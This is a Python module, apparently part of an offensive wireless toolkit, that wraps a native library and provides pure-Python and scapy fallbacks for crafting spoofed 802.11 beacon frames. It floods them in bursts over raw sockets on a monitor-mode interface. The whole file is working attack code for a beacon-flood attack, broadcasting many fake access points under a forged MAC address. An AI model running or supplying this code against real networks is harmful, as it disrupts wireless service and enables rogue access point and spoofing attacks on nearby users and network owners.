"""
posframework.native.beacon_flood - ctypes wrapper for libbeacon_flood.so

Provides high-speed beacon frame construction and flooding via the native
C library. Falls back to a pure-Python beacon builder if the shared library
is not compiled.

Requires root/CAP_NET_RAW for injection. Linux only.
"""

import ctypes
import struct
from ctypes import c_int, c_uint8, c_size_t, c_char_p, POINTER
from typing import List, Optional

from posframework.config import log
from posframework.native import get_lib

# ─── MAC Address Helpers ───────────────────────────────────────────────────────

_BROADCAST_MAC = b"\xff\xff\xff\xff\xff\xff"


def _mac_to_bytes(mac: str) -> bytes:
    """
    Convert MAC address string 'aa:bb:cc:dd:ee:ff' to 6-byte bytes.

    Args:
        mac: MAC address in colon-separated hex notation

    Returns:
        6-byte MAC address

    Raises:
        ValueError: If MAC format is invalid.
    """
    parts = mac.lower().split(":")
    if len(parts) != 6:
        raise ValueError(f"Invalid MAC address format: {mac}")
    try:
        return bytes(int(p, 16) for p in parts)
    except ValueError:
        raise ValueError(f"Invalid MAC address format: {mac}")


def _mac_to_ctypes(mac: str) -> "ctypes.Array":
    """Convert MAC string to ctypes uint8 array."""
    raw = _mac_to_bytes(mac)
    return (c_uint8 * 6)(*raw)


# ─── Native Library Setup ─────────────────────────────────────────────────────

_lib = get_lib("libbeacon_flood")
_USE_NATIVE = _lib is not None

if _USE_NATIVE:
    # size_t build_beacon(uint8_t *buf, size_t buf_size,
    #                     const uint8_t *src_mac,
    #                     const char *ssid, uint8_t channel)
    _lib.build_beacon.argtypes = [
        POINTER(c_uint8),
        c_size_t,
        POINTER(c_uint8),
        c_char_p,
        c_uint8,
    ]
    _lib.build_beacon.restype = c_size_t

    # int build_beacon_batch(uint8_t *buf, size_t buf_size,
    #                        size_t *frame_lens, int max_frames,
    #                        const uint8_t *src_mac,
    #                        const char **ssids, int ssid_count,
    #                        uint8_t channel)
    _lib.build_beacon_batch.argtypes = [
        POINTER(c_uint8),
        c_size_t,
        POINTER(c_size_t),
        c_int,
        POINTER(c_uint8),
        POINTER(c_char_p),
        c_int,
        c_uint8,
    ]
    _lib.build_beacon_batch.restype = c_int

    # int flood_beacons(int sock_fd, const uint8_t *buf,
    #                   const size_t *frame_lens, int frame_count)
    _lib.flood_beacons.argtypes = [
        c_int,
        POINTER(c_uint8),
        POINTER(c_size_t),
        c_int,
    ]
    _lib.flood_beacons.restype = c_int

    # int beacon_flood(const char *iface, const uint8_t *src_mac,
    #                  const char **ssids, int ssid_count,
    #                  uint8_t channel, int burst_count)
    _lib.beacon_flood.argtypes = [
        c_char_p,
        POINTER(c_uint8),
        POINTER(c_char_p),
        c_int,
        c_uint8,
        c_int,
    ]
    _lib.beacon_flood.restype = c_int

    log.debug("beacon_flood: using native C implementation")
else:
    log.warning("beacon_flood: libbeacon_flood.so not available, using Python fallback")


# ─── Fallback Frame Constants ─────────────────────────────────────────────────

# Minimal 8-byte radiotap header (version 0, no fields)
_RADIOTAP_HEADER = b"\x00\x00\x08\x00\x00\x00\x00\x00"

# Supported rates: 6,9,12,18,24,36,48,54 Mbps
_SUPPORTED_RATES = b"\x0c\x12\x18\x24\x30\x48\x60\x6c"

# Beacon capability: ESS + Short Preamble + Short Slot + Privacy
_BEACON_CAP = 0x2105


# ─── Public API ────────────────────────────────────────────────────────────────

def build_beacon_frame(src_mac: str, ssid: str, channel: int = 6) -> bytes:
    """
    Build a single beacon frame with RadioTap header.

    Args:
        src_mac: Source/BSSID MAC address (e.g., 'aa:bb:cc:dd:ee:ff')
        ssid: SSID string (max 32 chars)
        channel: WiFi channel number (1-14, default: 6)

    Returns:
        Complete beacon frame bytes ready for injection.
    """
    if _USE_NATIVE:
        buf = (c_uint8 * 128)()
        mac_arr = _mac_to_ctypes(src_mac)
        ssid_bytes = ssid.encode("utf-8") if isinstance(ssid, str) else ssid

        frame_len = _lib.build_beacon(
            buf, 128, mac_arr, ssid_bytes, channel
        )
        if frame_len == 0:
            log.warning(f"beacon_flood: build_beacon failed for SSID '{ssid}'")
            return _fallback_build_beacon(src_mac, ssid, channel)
        return bytes(buf[:frame_len])
    else:
        return _fallback_build_beacon(src_mac, ssid, channel)


def beacon_flood(
    iface: str,
    src_mac: str,
    ssids: List[str],
    channel: int = 6,
    burst_count: int = 1,
) -> int:
    """
    High-level beacon flood: build and send beacons for all SSIDs.

    Opens a raw socket, builds beacon frames for all SSIDs, and sends
    the batch burst_count times.

    Args:
        iface: Monitor mode interface name (e.g., 'wlan0mon')
        src_mac: Source/BSSID MAC address
        ssids: List of SSID strings to broadcast
        channel: WiFi channel number (default: 6)
        burst_count: Number of times to send the full batch (default: 1)

    Returns:
        Total number of frames sent, -1 on error.
    """
    if not ssids:
        return 0

    if _USE_NATIVE:
        mac_arr = _mac_to_ctypes(src_mac)
        iface_bytes = iface.encode("utf-8") if isinstance(iface, str) else iface

        # Build ctypes array of SSID strings
        ssid_count = len(ssids)
        ssid_arr_type = c_char_p * ssid_count
        ssid_arr = ssid_arr_type(
            *(s.encode("utf-8") if isinstance(s, str) else s for s in ssids)
        )

        result = _lib.beacon_flood(
            iface_bytes, mac_arr, ssid_arr, ssid_count, int(channel), int(burst_count)
        )
        if result < 0:
            log.warning(f"beacon_flood: native flood failed on {iface}")
        return result
    else:
        return _fallback_beacon_flood(iface, src_mac, ssids, channel, burst_count)


# ─── Fallback (Pure Python) Implementations ───────────────────────────────────

def _fallback_build_beacon(src_mac: str, ssid: str, channel: int) -> bytes:
    """
    Build a beacon frame using pure Python (no scapy, no native lib).

    Constructs: RadioTap(8) + Dot11(24) + Beacon(12) + SSID IE + Rates IE + DS IE
    """
    frame = bytearray(_RADIOTAP_HEADER)

    # Frame Control: Beacon (type=0, subtype=8) = 0x0080 LE
    frame += struct.pack("<H", 0x0080)
    # Duration
    frame += struct.pack("<H", 0)

    # Addr1: Destination (broadcast)
    frame += _BROADCAST_MAC
    # Addr2: Source (src_mac)
    src_bytes = _mac_to_bytes(src_mac)
    frame += src_bytes
    # Addr3: BSSID (src_mac)
    frame += src_bytes

    # Sequence Control
    frame += struct.pack("<H", 0)

    # Beacon fixed parameters
    frame += b"\x00" * 8          # Timestamp (8 bytes)
    frame += struct.pack("<H", 100)  # Beacon Interval (100 TU)
    frame += struct.pack("<H", _BEACON_CAP)  # Capability Info

    # SSID Information Element
    ssid_bytes = ssid.encode("utf-8")[:32]
    frame += bytes([0x00, len(ssid_bytes)])  # IE ID=0 (SSID), length
    frame += ssid_bytes

    # Supported Rates IE
    frame += bytes([0x01, len(_SUPPORTED_RATES)])  # IE ID=1 (Rates), length
    frame += _SUPPORTED_RATES

    # DS Parameter Set IE (channel)
    frame += bytes([0x03, 0x01, channel & 0xFF])  # IE ID=3, len=1, channel

    return bytes(frame)


def _fallback_beacon_flood(
    iface: str, src_mac: str, ssids: List[str], channel: int, burst_count: int
) -> int:
    """
    Fallback beacon flood using scapy sendp() or raw os.write().

    Tries scapy first; if unavailable, uses raw frame + os.write to
    a raw socket opened via the native packet_engine or AF_PACKET directly.
    """
    try:
        from scapy.all import sendp
        from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap

        sent = 0
        for _burst in range(burst_count):
            for ssid in ssids:
                pkt = (
                    RadioTap()
                    / Dot11(
                        type=0,
                        subtype=8,
                        addr1="ff:ff:ff:ff:ff:ff",
                        addr2=src_mac,
                        addr3=src_mac,
                    )
                    / Dot11Beacon(cap=_BEACON_CAP)
                    / Dot11Elt(ID="SSID", info=ssid.encode())
                    / Dot11Elt(ID="Rates", info=_SUPPORTED_RATES)
                    / Dot11Elt(ID="DSset", info=bytes([channel]))
                )
                sendp(pkt, iface=iface, verbose=False)
                sent += 1
        return sent
    except ImportError:
        log.debug("beacon_flood: scapy not available, using raw frame injection")
        return _fallback_raw_flood(iface, src_mac, ssids, channel, burst_count)


def _fallback_raw_flood(
    iface: str, src_mac: str, ssids: List[str], channel: int, burst_count: int
) -> int:
    """Last resort: raw socket write with pure-Python frame construction."""
    import os
    import socket

    # Try native packet_engine for socket
    pe_lib = get_lib("libpacket_engine")
    sock_fd = -1

    if pe_lib is not None:
        pe_lib.init_raw_socket.argtypes = [c_char_p]
        pe_lib.init_raw_socket.restype = c_int
        pe_lib.close_raw_socket.argtypes = [c_int]
        pe_lib.close_raw_socket.restype = None
        sock_fd = pe_lib.init_raw_socket(iface.encode("utf-8"))

    if sock_fd < 0:
        # Fallback: open AF_PACKET socket directly
        try:
            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
            s.bind((iface, 0))
            sock_fd = s.fileno()
        except OSError as e:
            log.error(f"beacon_flood: cannot open raw socket on {iface}: {e}")
            return -1

    sent = 0
    for _burst in range(burst_count):
        for ssid in ssids:
            frame = _fallback_build_beacon(src_mac, ssid, channel)
            try:
                os.write(sock_fd, frame)
                sent += 1
            except OSError as e:
                log.warning(f"beacon_flood: write failed: {e}")
                if pe_lib is not None:
                    pe_lib.close_raw_socket(sock_fd)
                return sent if sent > 0 else -1

    if pe_lib is not None:
        pe_lib.close_raw_socket(sock_fd)

    return sent
